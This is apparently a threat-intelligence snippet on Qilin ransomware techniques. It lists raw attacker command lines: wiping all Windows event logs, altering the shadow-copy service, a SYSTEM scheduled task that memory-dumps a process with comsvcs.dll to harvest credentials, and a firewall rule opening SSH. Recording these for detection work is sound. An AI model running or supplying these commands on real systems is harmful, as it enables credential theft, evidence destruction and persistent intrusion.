title: Uncovering Qilin attack methods exposed through multiple cases

powershell $logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | Select-Object -ExpandProperty LogName ; ForEach ( $l in $logs | Sort | Get-Unique ) {[System.Diagnostics.Eventing.Reader]::EventLogSession::GlobalSession.ClearLog($l)}
cmd /C wmic service where name='vss' call ChangeStartMode Manual

cmdline_items: schtasks /create /sc minute /mo 30 /tn asd /ru system /rl highest /f /tr "CSIDL_SYSTEM\\rundll32.exe c:\\windows\\system32\\comsvcs.dll, minidump 1020 c:\\users\\defautl\\out.dmp full"

powershell.exe -noni -nop -w 1 New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
